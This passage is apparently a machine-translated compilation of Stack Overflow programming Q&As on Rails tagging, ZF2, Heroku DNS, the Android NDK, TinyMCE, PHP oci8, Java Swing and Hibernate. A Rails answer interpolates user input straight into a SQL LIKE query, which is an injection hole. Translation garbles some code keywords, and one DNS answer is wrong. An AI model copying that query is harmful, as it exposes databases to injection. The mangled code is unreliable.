    Tag.find_by_name!(name).pictures
  end

  def self.tag_counts
    Tag.select("tags.*, count(taggings.tag_id) as count").
    joins(:taggings).group("tags.id")
  end

  def tag_list
    tags.map(&:name).join(", ")
  end

  def tag_list=(names)
    self.tags = names.split(",").map do |n|
      Tag.where(name: n.strip).first_or_create!
    end
  end
end 
```

下面我可以弄清楚我无法查询数据库

**`/models/tag.rb`**

```
class Tag < ActiveRecord::Base
  attr_accessible :name
  has_many :taggings
  has_many :pictures, through: :taggings

  def self.tokens(query)
    tags = where("name like ?", "%#{query}%")
    if tags.empty?
      [{id: "<<<#{query}>>>", name: "New: \"#{query}\""}]
    else
      tags
    end
  end

  def self.ids_from_tokens(tokens)
    tokens.gsub!(/<<<(.+?)>>>/) { create!(name: $1).id }
    tokens.split(',')
  end
end 
```

我设置标签控制器行为的方式也是如此

**`#controllers/tags_controller.rb`**

```
class TagsController < ApplicationController
  def index
   @tags = Tag.all
   respond_to do |format|
     format.html
     format.json { render json: @tags.tokens(params[:q]) }
   end
  end
end 
```

那么，为什么我无法查询 Postgresql 并且无法动态**创建**或**查找**？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T07:12:54.203

我合并了一个非常简单的解决方案：使用带有[jQ​​uery Tokeninput的 Gem](http://loopj.com/jquery-tokeninput/) [ActsAsTaggableOn](https://github.com/mbleigh/acts-as-taggable-on)

如果你通过下面的算法，你会发现上面的问题只是对 Tag System 和 jQuery 之间的配置的误解。以下步骤将在您的道路上为您提供帮助：

1 将 jQuery Tokeninput 文件放在正确的位置：

`Vendor > assets > javascripts > jquery-tokeninput.js`

`Vendor > assets > stylesheets > token-input-facebook.css (and 2 others)`

2 在`apps > assets > javascripts > application.js`wright 这一行之前的文件中 //= require_tree 。*这使javascript工作*

`//= require jquery.tokeninput`

3 在`apps > assets > stylesheets > application.css.scss`*= require_tree 之前的 wright 文件中。*这使CSS工作*

`*= require token-input-facebook`

4`gem 'acts-as-taggable-on'`安装`gemfile`并运行*bundle install和与*[此处](http://railscasts.com/episodes/382-tagging)相同的步骤。

`routes.rb`5为标签控制器索引（我们即将定义）创建一个自定义路由以启用 json 属性

`get '/tag.json', to: 'tag#index', as: :pictures_tags`

# 以下代码和上面的代码允许我们正确地与数据库交谈

6 运行 a`rails g tag controller index`并在此文件上写入以下内容：

> `#tag_controller.rb`
> 
> 定义索引

```
 query = params[:q]
     query = query.chomp(" ").downcase
     @tags = ActsAsTaggableOn::Tag.where("tags.name LIKE '%#{query}%' OR tags.name LIKE '#{query}'")

if @tags.empty?
    ActsAsTaggableOn::Tag.find_or_create_by_name_and_id(id: "#{query}", name: "#{query}")
else 
    respond_to do |format|
        format.html
        format.json { render json: @tags.collect{ |tag| {id: tag.name, name: tag.name } } }
    end
 end 
```

> 结尾

7 最后将所有内容与您将放置的代码粘合在一起`app > assets > javascript > your_file_with_tags.js.coffee`

> `#your_file_with_tags.js.coffee`
> 
> jQuery->

```
$('#field_with_tag_list').tokenInput '/tag.json'

    theme: 'facebook'

    prePopulate: $('#field_with_tag_list').data('load')

    preventDuplicates: true

    resultsLimit: 3

    tokenLimit: 7

    tokenDelimiter: ","

    searchingText: "hit space for New Tag" 
```

# PS：#field_with_tag_list 在您的视图中（通常是 _form 部分），您可以生成这样的标签： (#controller_tag_list) 即 #pictures_tag_list

`<div class="field">`

```
`<%= f.label :tag_list %><br />`

`<%= f.text_field :tag_list, data: {load: @picture.tag_list.map {|tag| { id: tag, name: tag }}} %>` 
```

`</div>`

# 所有这些都是经过实验的代码，我相信这会对你有所帮助 =]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T06:28:46.127

在您的控制器上尝试：

```
 @tags = Tag.order(:name) 
```

就这样。

# php - 如何告诉 ZF2 的 JsonModel 返回 text/plain 而不是 application/json？

> ID：12820415
> 
> 赞同：4
> 
> 时间：2012-10-10T13:23:44.077
> 
> 标签：php, json, zend-framework2

使用 PHP Zend Framework 2.0.2，我在 AJAX 调用后返回 JSON 数据。显然，Internet Explorer 9 想要下载数据而不是将其返回给调用 Javascript 方法。

[像这个](https://stackoverflow.com/questions/2483771/how-can-i-convince-ie-to-simply-display-application-json-rather-than-offer-to-do)和[这个这样](https://stackoverflow.com/questions/11266183/ie-wants-to-download-json-result-mvc3)的帖子说使用`Content-Type: text/plain`而不是`Content-Type: application/json`，但是我如何使用 ZF2 的 JsonModel 来做到这一点？我是新手...

我想我必须在`setOptions()`数组中设置一些东西，但是什么？

```
public function testJsonAction()
{
   $jsonResponse = new JsonModel(array('success' => false));

   $jsonResponse->setOptions(array(
         // ** Should I put something here? What? **
   ));

   return $jsonResponse;
} 
```

我尝试使用这些：

```
 $this->getResponse()->getHeaders()->addHeaderLine('Content-Type', 'text/plain');
  $this->getResponse()->getHeaders()->addHeaderLine('Content-Disposition', 'inline; filename="textdata.json"'); 
```

但它不会更改响应标头中的 HTTP Content-Type：

```
Key                   Value
Response              HTTP/1.1 200 OK
Content-Type          application/json
Server                Microsoft-IIS/7.5
X-Powered-By          PHP/5.3.13
Set-Cookie            ZDEDebuggerPresent=php,phtml,php3; path=/
Content-Disposition   inline; filename="textdata.json"
X-Powered-By          ASP.NET
Date                  Wed, 10 Oct 2012 13:19:42 GMT
Content-Length        17 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T01:57:00.130

因为当 \Zend\Mvc\MvcEvent::EVENT_RENDER 事件发生时，JsonStrategy 会再次改变 content-type。源代码在

Zend\View\Strategy\JsonStrategy->injectResponse();

因此，为了将 content-type 替换为您的，您需要在 JsonStrategy 注入后使用 EventManager 注入您的自定义标头。

在您的控制器中尝试以下代码：

```
 $this->getServiceLocator()->get('Application')->getEventManager()->attach(\Zend\Mvc\MvcEvent::EVENT_RENDER, function($event){
     $event->getResponse()->getHeaders()->addHeaderLine('Content-Type', 'text/plain');
 }, -10000); 
```

# ruby-on-rails - Heroku 子域 DNS

> ID：12820418
> 
> 赞同：0
> 
> 时间：2012-10-10T13:23:48.007
> 
> 标签：ruby-on-rails, heroku, dns, subdomain, wildcard-subdomain

我有一个带有自定义域和通配符子域的 Rails 应用程序托管在 Heroku (Cedar) 上。我们称之为[https://mysite.com](https://mysite.com)。

例如，如果用户访问[https](https://bobcat.mysite.com) ://bobcat.mysite.com，Rails 应用程序被配置为仅提供与 bobcat 帐户相关的数据。

bobcat.com 在域名公司注册 - 与 Heroku 无关。我想更改 DNS 设置，以便 bobcat.com 重定向到[https://bobcat.mysite.com](https://bobcat.mysite.com)。我使用哪些 CNAME 设置？我在我的 Heroku 帐户上做什么。

请原谅这个问题，这可能可以通过充分的谷歌搜索来回答，但我不会弄错这个......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T22:14:03.830

自定义域上的[**Heroku 文档**](https://devcenter.heroku.com/articles/custom-domains)为您保存所有信息。

`bobcat.com`为和设置条目尤为重要`www.bobcat.com`，这在 DNS 中是两个单独的条目。

对于 Heroku，`www.bobcat.com`由 CNAME 处理`myapp.herokuapp.com`（在雪松堆栈上）。

对于“裸域”，例如`bobcat.com`不能指定 cname（由于 DNS 规范中的限制），因此您有两个选择：

1)`bobcat.com`将 A 记录指向上述文档中指定的 IP 地址。

或者

2）重定向`bobcat.com`到`www.bobcat.com`使用[wwwizer的免费服务](http://wwwizer.com/naked-domain-redirect)。只需将`bobcat.com`A-Records 指向`174.129.25.170`. 我在我的几个项目中使用了这种方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:55:55.557

所以我相信，在域名的 DNS 设置中`bobcat.com`，您需要创建一条新`CNAME`记录。

所以它会是：

```
Hostname: bobcat.com
Type: CNAME
Destination CNAME: https://bobcat.mysite.com 
```

# c# - 相当于 Visual Studio 2010 中 C# 项目的 VCPostBuildEventTool

> ID：12820420
> 
> 赞同：1
> 
> 时间：2012-10-10T13:23:55.073
> 
> 标签：c#, visual-studio-2010, pre-build-event

我正在为 Visual Studio 编写一个插件，它为生产代码项目创建一个测试项目。它应该支持 C、C++ 和 C# 项目。对于 C/C++ 项目，我可以使用 VCPostBuildEventTool 以编程方式设置发布和预构建事件。

这就是我从 Project 对象中获取它的方式：

```
VCProject vcTestProj = (VCProject)testProj.Object;
IVCCollection testProjCfgs = (IVCCollection)vcTestProj.Configurations;
VCConfiguration testProjDebugCfg = (VCConfiguration)testProjCfgs.Item("Debug");
VCLinkerTool testProjLinkerTool = (VCLinkerTool)((IVCCollection)testProjDebugCfg.Tools).Item("VCLinkerTool");
VCCLCompilerTool testProjectCompileTool = (VCCLCompilerTool)((IVCCollection)testProjDebugCfg.Tools).Item("C/C++ Compiler Tool");
VCPreBuildEventTool testProjPreBuildTool = (VCPreBuildEventTool)((IVCCollection)testProjDebugCfg.Tools).Item("Pre-Build Event Tool");
VCPostBuildEventTool testProjPostBuildTool = (VCPostBuildEventTool)((IVCCollection)testProjDebugCfg.Tools).Item("Post-Build Event Tool"); 
```

但是 C# 项目不能用作 VCProject，而且我找不到以编程方式访问它的构建前和构建后事件的方法。无论如何要这样做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:39:36.033

C#/VB.NET 项目被视为相同，因此它们是`ProjectProperties3`（或`ProjectProperties2`）接口的一部分，

[http://msdn.microsoft.com/en-us/library/vslangproj2.projectproperties2.postbuildevent.aspx](http://msdn.microsoft.com/en-us/library/vslangproj2.projectproperties2.postbuildevent.aspx)

中提到了如何达到该级别

[http://msdn.microsoft.com/en-us/library/ms228958.aspx](http://msdn.microsoft.com/en-us/library/ms228958.aspx)

# android - ubuntu 12.10 32位上的android ndk-build错误

> ID：12820421
> 
> 赞同：4
> 
> 时间：2012-10-10T13:23:54.863
> 
> 标签：android, ubuntu, android-ndk

我已经在我的 ubuntu 12.10 beta 2 上下载了最新的 android ndk r8b。我已将 ndk 目录包含在 PATH 变量中（当我在终端中编写 ndk-b 并点击选项卡时，它会自动完成它）。但是当我尝试时：

cd android-ndk/samples/san-angeles/jni
ndk-build

我收到此错误：

```
make: /home/mixpro/Android/android-ndk/toolchains/arm-linux-androideabi-4.6/prebuilt/linux-x86/bin/arm-linux-androideabi-gcc: Command not found  
make: /home/mixpro/Android/android-ndk/toolchains/arm-linux-androideabi-4.6/prebuilt/linux-x86/bin/arm-linux-androideabi-gcc: Command not found  
Compile thumb  : sanangeles <= importgl.c
make: /home/mixpro/Android/android-ndk/toolchains/arm-linux-androideabi-4.6/prebuilt/linux-x86/bin/arm-linux-androideabi-gcc: Command not found  
make: *** [/home/mixpro/Android/android-ndk/samples/san-angeles/obj/local/armeabi/objs/sanangeles/importgl.o] Error 127 
```

当使用 ls 检查 /android-ndk/toolchains/arm-linux-androideabi-4.6/prebuilt/linux-x86/bin 目录时，我得到：
`arm-linux-androideabi-addr2line arm-linux-androideabi-g++
arm-linux-androideabi-gdbtui arm-linux-androideabi-size
arm-linux-androideabi-c++filt arm-linux-androideabi-gcc-4.6.x-google
arm-linux-androideabi-gprof arm-linux-androideabi-strings
arm-linux-androideabi-cpp arm-linux-androideabi-gcov
arm-linux-androideabi-readelf arm-linux-androideabi-elfedit
arm-linux-androideabi-gdb arm-linux-androideabi-run`

表示目录中没有 arm-linux-androideabi-gcc

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-13T19:56:38.743

恐怕您以某种方式删除了 arm-linux-androideabi-addr2line arm-linux-androideabi-gcc 。在 linux 上，它只是 arm-linux-androideabi-gcc-4.6.x-google 的符号链接，因此很容易恢复它。但也许，为了安全起见，重新安装 NDK 是值得的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-12T09:17:21.893

你应该像这样创建符号链接：ln -s /usr/bin/arm-linux-gnueabi-gcc-4.7 "/home/sofien/Bureau/android-ndk-r8c/toolchains/arm-linux-androideabi-4.6/prebuilt /linux-x86/bin/arm-linux-androideabi-gcc"

# extjs4 - ExtJS MVC 延迟控制直到网格加载

> ID：12820422
> 
> 赞同：0
> 
> 时间：2012-10-10T13:23:56.833
> 
> 标签：extjs4, extjs-mvc

我在 ExtJS 4.0.7 中有一个文本框和一个网格。我想在文本框中输入一些内容并在更改时更新网格。在控制器中使用此代码段

```
init : function() {
    this.control({
        'filter' : {
            change : function(current, previous, eOpts) {
                console.log(this.getMyGrid());
            }
        } 
```

当更改事件首次触发时，我的网格尚未定义。我该如何解决这个问题——理想情况下我想最后加载“过滤器”文本字段？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T07:58:40.517

可以直接在商店上工作，对商店的任何更改也将在网格中可见。因此，诀窍是直接在商店上工作，而不是获取网格：

```
this.getStore('GridDataStore') 
```

# javascript - TinyMCE 如何将 baseURL 附加到 LINK 和图像的基本路径

> ID：12820427
> 
> 赞同：4
> 
> 时间：2012-10-10T13:24:02.653
> 
> 标签：javascript, editor, tinymce, wysiwyg

我正在使用 TinyMCE 来编辑我的网站内容。

在本地，我的基本 url 有不同的路径，在开发服务器上它不同，而在生产上它不同。

有没有办法`baseURL`为我的链接和`basePath`要链接的图像定义类似的东西。

我想定义我所有的`baseURL`链接和`basePath`我的所有图像。

现在我正在我的本地工作，我已经创建了几个页面。但是当我想到开发和生产时，将很难完成路径更改任务。请迫切需要一些解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2020-04-15T15:40:57.270

我认为您将需要设置这三个选项：

```
relative_urls : false,
remove_script_host : false,
document_base_url : "http://www.example.com/path1/" 
```

根据[TinyMCE 文档](https://www.tiny.cloud/docs/configure/url-handling/)，这将根据您提供的基础将所有相对 url 转换为完全限定的 URL。

[![相关 TinyMCE 文档的屏幕截图](../Images/44e9c32d049f70f20e135e29355988b6.png)](https://i.stack.imgur.com/o7iiS.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-09-23T15:34:32.183

[![在此处输入图像描述](../Images/8ead1c1dda97b411739be65efe461ca8.png)](https://i.stack.imgur.com/kKrSv.png)

```
 function myCustomURLConverter(url, node, on_save, name) {
            // Do some custom URL conversion
            if (name == "src")
            {
                url = window.location.origin +"/uploads/" + url
            }
            // Return new URL
            return url;
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:36:04.257

我不确定我是否理解这个问题，但这不会提供您正在寻找的东西吗？

```
var base = "http://"+window.location.host;
// base = "http://stackoverflow.com"
var img_base = base + "/img"
// img_base = "http://stackoverflow.com/img" 
```

# windows - PHP 5.3.1 未在 Windows 上加载 php_oci8.dll

> ID：12820429
> 
> 赞同：6
> 
> 时间：2012-10-10T13:24:07.670
> 
> 标签：windows, oracle, php

我正在尝试在 php 上加载 oracle 扩展，但我遇到了错误：

> **警告**：PHP 启动：无法加载动态库 'D:\Program Files\xampp\php\ext\php_oci8.dll' - 找不到指定的过程。在第**0**行的**未知中**

 **到目前为止我已经做了：

1.  在 windows 路径中包含 oracle 即时客户端的完整路径
2.  在 php.ini 上，`extension_dir`指向正确的位置
3.  在 php.ini`extension=php_oci8.dll`上没问题
4.  重新启动了apache，没有任何效果。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-10T14:47:41.513

通过将文件 orannzsbb11.dll 、 oci.dll 和 oraociei11.dll 复制到 c:\windows\system32 解决了问题

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-09T14:21:05.667

我通过在我的 Windows PATH 环境变量中添加“C:\Program Files (x86)\PHP\v5.3\ext”解决了这个问题。如果您升级 PHP，您只需要记住更改路径。我认为这比复制 dll 更好，如果您最终在同一台机器上使用不同版本的多个 dll，这可能会导致问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-02-13T14:09:57.573

您需要从此超链接[http://www.oracle.com/technetwork/topics/winsoft-085727.html](http://www.oracle.com/technetwork/topics/winsoft-085727.html)下载 Oracle Instant 客户端 。在用户环境变量和系统变量上添加即时客户端的路径。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-05-20T00:14:45.373

对我来说，这是由于没有安装 Visual C++ Redistributable for Visual Studio 2008 SP1（用于 VC9）造成的。当我运行 Windows 7 64 位时，我必须获得 x64 包。希望这可以帮助有同样问题的人。安装后，PHP 不再报告这些错误。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-02-11T07:42:16.037

对某些人来说可能很明显，但最初对我而言并非如此：如果您仍然看到此`The specified procedure could not be found. in Unknown on line 0`错误，即使在安装了即时客户端、SDK 等之后 - 确保将 Oracle 即时客户端路径放在**系统**“PATH”中" 变量，而不是**用户**变量，因为在 Apache 运行时用户显然不会被使用。您可以通过查看 phpinfo() 输出中显示的 PATH 值来验证即时客户端路径是否设置正确。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-01-27T15:54:04.240

我发现这个问题背后的主要原因是 oracle 的 oci8 驱动程序版本。最后我能够连接到 oracle 和我在[http://angularcode.com/connecting-php-to-oracle-database-10g/描述的步骤](http://angularcode.com/connecting-php-to-oracle-database-10g/)**

# c# - 如果 .net DLL 周围的 com 包装器使用了更多依赖的 .net DLL，是否应该将它们放在 GAC 中？

> ID：12820430
> 
> 赞同：0
> 
> 时间：2012-10-10T13:24:10.627
> 
> 标签：c#, gac, managed, ccw

如果托管 DLL 使用一个或多个托管 DLL，并且围绕托管 DLL 构建了一个 com 包装器，那么所有相关的托管 DLL 都应该放在 GAC 中。在类似的情况下，我收到“无法找到程序集......”。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T18:41:48.647

事实证明，将程序集保留在 GAC 中是一种很好的方式，以防 COM 包装器引用这些 dll。.net 运行时可以轻松找到它们。

# c# - 如何从 asp:Gridview 列中删除可点击的链接？

> ID：12820443
> 
> 赞同：0
> 
> 时间：2012-10-10T13:24:40.383
> 
> 标签：c#, asp.net

当某些条件为真时，我想从 asp:Gridview 列中删除一个可点击的链接。

我试过这个：

```
Gridview.attributes["disabled"] = "disabled"; 
```

但是超链接仍然是可点击的。当网格被禁用时，我不想要可点击的超链接。我怎样才能在 C#.net 中做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:31:05.517

使用 jQuery：

```
$("a", $("#<%=Gridview.ClientID%>")).each(function(index){
  $(this).attr("disabled", true);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:36:24.050

您可以使用索引设置列。

```
if (someCond) 
{ 
  ((BoundField)GridView1.Columns[0]).DataFormatString = "{0:dd-MMM-yyyy}"; 
  ((BoundField)GridView1.Columns[2]).DataFormatString = "{0:f2}"; 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:45:22.300

您应该使用`Item_Databound`事件并在其中编写代码来检查条件，然后您可以轻松禁用启用任何服务器端控件等。

# ms-access - MS Access查询检查表单字段是否为空

> ID：12820453
> 
> 赞同：1
> 
> 时间：2012-10-10T13:25:09.100
> 
> 标签：ms-access

我有一个多字段表单并使用它来检索表的记录。如果字段中没有用户输入，我想允许相应列的“*”和空值，否则用户输入。

我试过

```
Like IIf([Forms]![frm_searchForm]![Titel]="" Or IsNull([Forms]![frm_searchForm]![Titel]);Like "*" Or Is Null;[Forms]![frm_searchForm]![Titel]) 
```

也

```
Like IIf(IsEmpty([Forms]![frm_searchForm]![Titel]);Like "*" Or Is Null;[Forms]![frm_searchForm]![Titel]) 
```

但在这两种情况下，IIf 函数总是触发 else 表达式。如何检查表单中的字段是否为空？没有VB，这甚至可能吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:49:38.167

AFAICT，当`[Forms]![frm_searchForm]![Titel]`包含一个值时，您只需要某些字段包含该值的那些行。

但是，如果`[Forms]![frm_searchForm]![Titel]`是 Null 或空字符串，您希望检索所有行。

如果这是正确的，请尝试`WHERE`类似以下的子句：

```
WHERE
       Len([Forms]![frm_searchForm]![Titel] & '') = 0
    OR some_field Like '*' & [Forms]![frm_searchForm]![Titel] & '*' 
```

`PARAMETERS`还要在 SQL 语句的开头添加一个子句：

```
PARAMETERS [Forms]![frm_searchForm]![Titel] Text ( 255 ); 
```

# java - 值增加但立即回到零

> ID：12820464
> 
> 赞同：0
> 
> 时间：2012-10-10T13:25:37.293
> 
> 标签：java, field, inner-classes

我这里有我的俄罗斯方块项目的代码片段。

```
private class Game implements Runnable  {
    private int numDropped = -1;
    public void setCount(int count){
        count++;
    }
    public int getCount(){
        return count;
    }
    public void run() {
        int column = 4, style = Piece.SHAPES[(int) (Math.random() * 7)][(int) (Math.random() * 4)];
        while (onPlay) {
            if (piece != null) {
                if (piece.isAlive()) {
                    try {
                        Thread.currentThread().sleep(100);
                    } 
                    catch (InterruptedException ie) {
                        ie.printStackTrace();
                    }
                    continue;
                }
            }

            checkFullLine();  
            if (isGameOver()) {
                playItem.setEnabled(true);
                pauseItem.setEnabled(true);
                resumeItem.setEnabled(false);
                rightPanel.setPlayButtonEnable(true);
                rightPanel.setPauseButtonLabel(true);

                displayGameOver();
                return;
            }
            piece = new Piece(style, -1, column, board);
            piece.start();
            style = Piece.SHAPES[(int) (Math.random() * 7)][(int) (Math.random() * 4)];
            rightPanel.setTipStyle(style);
            numDropped = numDropped+1;
            RightPanel.scoreTextField.setText(numDropped+"");
        }
    }
} 
```

顺便说一下，这个类`Game`是一个内部类。每当一个新的部分下降时，`numDropped`增量的值（如 JTextField 中显示的那样）但不久之后又回到零。我放错地方了吗

```
numDropped = numDropped+1;
RightPanel.scoreTextField.setText(numDropped+""); 
```

? 或者因为其他的东西，比如存在之类的`static`东西。请帮我。我是Java的新手。非常感谢你！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:34:16.307

您发布的代码绝对不会将 更新`scoreTextField`为小于之前使用的值的值。

我怀疑的第一件事是有一些其他代码更新`scoreTextField`为不等于`numDropped`.

## 更新

在您另外发布的代码中，我看到了这一点：

```
RightPanel.scoreTextField = new JTextField(numDropped+""); 
```

这是错误的；删除它并取消注释上面的行，该行设置现有文本字段上的文本。

此外，您还有以下代码：

```
timer = new Timer(
                500, new ActionListener() {
                    public void actionPerformed(ActionEvent ae) {
                        scoreTextField.setText("" + game.getScore());
                        int scoreForLevelUpdate = game.getScoreForLevelUpdate();
                        if (scoreForLevelUpdate >= Tetris.PER_LEVEL_SCORE && scoreForLevelUpdate > 0)
                            game.levelUpdate();
                    }
                }
        );

        timer.start(); 
```

显然，这将`scoreTextField`用游戏分数覆盖您，而在`Game`' 循环中，您正在写入丢弃元素的数量。从变量的名称来看`scoreTextField`，您应该更改代码`Game`以更新其他一些文本字段，而不是用于显示分数的文本字段。

您的设计中的另一件事是错误的：

```
Thread thread = new Thread(new Game());
thread.start(); 
```

您正在启动另一个线程来控制游戏玩法。您不得在主 GUI 线程（即所谓的事件调度线程 (EDT)）之外更新任何 Swing 组件。我的建议是重新设计您的代码，类似于您在上面对`timer`变量所做的操作：不要启动另一个线程；而是以 100 毫秒的间隔安排另一个，并根据您当前的代码`Timer`实现关联——您需要更改的只是不再需要循环。当然，也会是多余的。当游戏结束时，只是你的计时器任务。`actionPerformed``while (onPlay)``Thread.sleep(100)``cancel`

与this question的问题没有直接关系，但是这段代码

```
public void setCount(int count){
    count++;
} 
```

也是错误的：它不写入实例变量`count`，而只是增加提供的参数，立即丢弃它（它只是一个局部变量）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:43:52.783

我可以看到它如何设置为零的唯一两个地方如下：

```
public int getScore() {
        if (board != null) 
            return board.getScore();
        return 0;
    } 
```

和

```
 public int getScoreForLevelUpdate() {
        if (board != null) 
            return board.getScoreForLevelUpdate();
        return 0;
    } 
```

在某些时候，您的`board`对象会被清空，可能是在重置功能中。将调试器绑定到进程并在这两个函数中放置一个断点。

# c# - 带有 IXML 的新 XML 节点

> ID：12820469
> 
> 赞同：1
> 
> 时间：2012-10-10T13:25:49.280
> 
> 标签：c#, xml, microsoft-metro

我正在使用 XML 文件制作一个 Windows 8 Metro Style 测试应用程序。我可以读取文件和节点，包括编辑和删除它们。

我现在面临的问题并且无法弄清楚如何完成是添加节点。下面是我用于读取和保存的代码。

```
private static async System.Threading.Tasks.Task<XmlDocument> LoadXML()
    {
        StorageFolder storageFolder = ApplicationData.Current.RoamingFolder;
        StorageFile storageFile = await storageFolder.GetFileAsync("Settings.xml");
        var XmlFile = await XmlDocument.LoadFromFileAsync(storageFile);
        return XmlFile;
    }

    private static async System.Threading.Tasks.Task SaveXML(XmlDocument XmlFile)
    {
        StorageFolder storageFolder = ApplicationData.Current.RoamingFolder;
        StorageFile storageFile = await storageFolder.GetFileAsync("Settings.xml");
        await XmlFile.SaveToFileAsync(storageFile);

        MessageDialog Message = new MessageDialog("Data is saved/removed!", "Notification");
        await Message.ShowAsync();
    } 
```

下面这部分是指上述两个事件。在这部分代码中，我是否需要根据来自文本框的信息添加一个新节点。

```
 private async void btnSaveproject_Click(object sender, RoutedEventArgs e)
    {
        var XmlFile = await LoadXML();

        await SaveXML(XmlFile);
    } 
```

对于那些想知道我是如何完成删除和编辑的人，我还会在下面添加这些代码部分。

```
 // Removing
    IXmlNode Node = XmlFile.SelectSingleNode("XML").SelectSingleNode("List").SelectSingleNode(lvList.SelectedItem.ToString());
    XmlFile.SelectSingleNode("XML").SelectSingleNode("List").RemoveChild(Node);

    //Saving
    XmlFile.SelectSingleNode("XML").SelectSingleNode("Colors").SelectSingleNode("ColorR").InnerText = tbxColorR.Text; 
```

# embedded-linux - 内核不识别 u-boot 标记的 NAND 坏块

> ID：12820472
> 
> 赞同：2
> 
> 时间：2012-10-10T13:25:54.723
> 
> 标签：embedded-linux, u-boot

在基于 ARM 的板（DM368）的 u-boot 中，我手动将某些内核分区块标记为坏。U-boot 说它已被标记，例如，在写入/读取内核映像时，我看到它跳过了这个坏块。

但是当我尝试从 Linux 中写入相同的分区（通过 NFS 加载）时，我看到 Linux 的 nandwrite 命令使用了这个坏块！我以多种方式检查了这一点——Linux 100% 忽略坏块标记。但是在互联网上到处都说 BBT 是 u-boot 和 Linux 的一种。

那么，问题在哪里？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-11T13:56:51.577

OK，找到答案了。由于某些不清楚的原因，我用于开发的板 DM365EVM 的制造商德州仪器为内核提供了不同的 BBT 结构。他们将 BBT 偏移量定义为 2，而全世界，包括提供的 u-boot，都将这个偏移量定义为 8。祝他们多年来身体健康。

# wxpython - 在多行 wxTextCtrl 中替换任意行的最佳方法

> ID：12820476
> 
> 赞同：1
> 
> 时间：2012-10-10T13:26:15.580
> 
> 标签：wxpython, wxtextctrl

GetLineText 非常适合获取特定的行，但没有对应的 SetLineText。如果存在的话，那就是我正在寻找的东西。既然它似乎没有，那么处理这个问题的最佳方法是什么？

注意：我不想每次都替换所有文本，因为我担心性能。我的用例让我为另一个控件中的每个字符更改替换一行（或行范围）。因此，让我调用 SetValue 的解决方案不是我想要的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T15:56:51.737

我认为您正在寻找的是 Replace() 方法：

替换（自我，从，到，价值）

[http://wxpython.org/docs/api/wx.TextCtrl-class.html](http://wxpython.org/docs/api/wx.TextCtrl-class.html)

# java - Hibernate 中的 SortedMap 密钥持久性

> ID：12820477
> 
> 赞同：3
> 
> 时间：2012-10-10T13:26:16.610
> 
> 标签：java, hibernate, jpa, map, key

我希望有人可以帮助我解决我的休眠问题，因为我已经在谷歌上敲了大约一个小时而没有结果。

所以问题是我在一个类中有一个 SortedMap，使用 Integer 作为键（及其自然的内置 compareTo 方法）和另一个类作为值类型。我正在使用密钥来保持用户定义的值类型的顺序，并试图让 Hibernate 坚持这一点。

无论出于何种原因，Hibernate 默认忽略我输入的键，而是使用值类型的主键作为键。当我从数据库中加载我的地​​图时，我的所有密钥都以这种方式进行了更改。

Map 的定义如下所示（我使用的是注解式 Hibernate）；

```
@ManyToMany(cascade = CascadeType.ALL)
@MapKey
@Sort(type = SortType.NATURAL)
private SortedMap<Integer, Column> columnOrder; 
```

我不能使用 Column 类型来存储订单本身，因为 Column 可以在包含类型的许多实例中使用，每次都有不同的键值。任何指导将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T14:28:37.570

所以我在发现这个 StackOverflow 问题后找到了答案：[使用 JPA2 和 Hibernate 的 Java 原语的排序映射？](https://stackoverflow.com/questions/6878015/sorted-map-of-java-primitives-using-jpa2-and-hibernate)

通过将 @MapKey 注释更改为 @MapKeyColumn 注释，我能够向 Hibernate 发出指令以将键保存在我指定的列名中，如下所示；

```
@ManyToMany(cascade = CascadeType.ALL)
@MapKeyColumn(name = "hierarchyOrdering")
@Sort(type = SortType.NATURAL)
private SortedMap<Integer, Column> columnOrder; 
```

谢谢您的帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:56:39.383

来自的javadoc `javax.persistence.OrderColumn`：

> 指定用于维护列表的持久顺序的列。持久性提供者负责在检索时和在数据库中维护订单。持久性提供者负责在刷新到数据库时更新排序以反映影响列表的任何插入、删除或重新排序。

因此，可以为此使用列表。

JPA 2.0 规范在第 2.2 节持久字段和属性中声明：

> 集合值持久字段和属性必须根据以下集合值接口之一定义，无论实体类是否遵守上述 JavaBeans 方法约定以及是否使用字段或属性访问：java.util.Collection , java.util.Set, java.util.List[3], java.util.Map。应用程序可以使用集合实现类型在实体持久化之前初始化字段或属性。一旦实体被管理（或分离），后续访问必须通过接口类型。

所以似乎`SortedMap`JPA 不支持 a 。

# macos - 在 Mac 上配置 Jenkins + git 插件导致 git clone 挂起

> ID：12820480
> 
> 赞同：0
> 
> 时间：2012-10-10T13:26:22.727
> 
> 标签：macos, git, jenkins

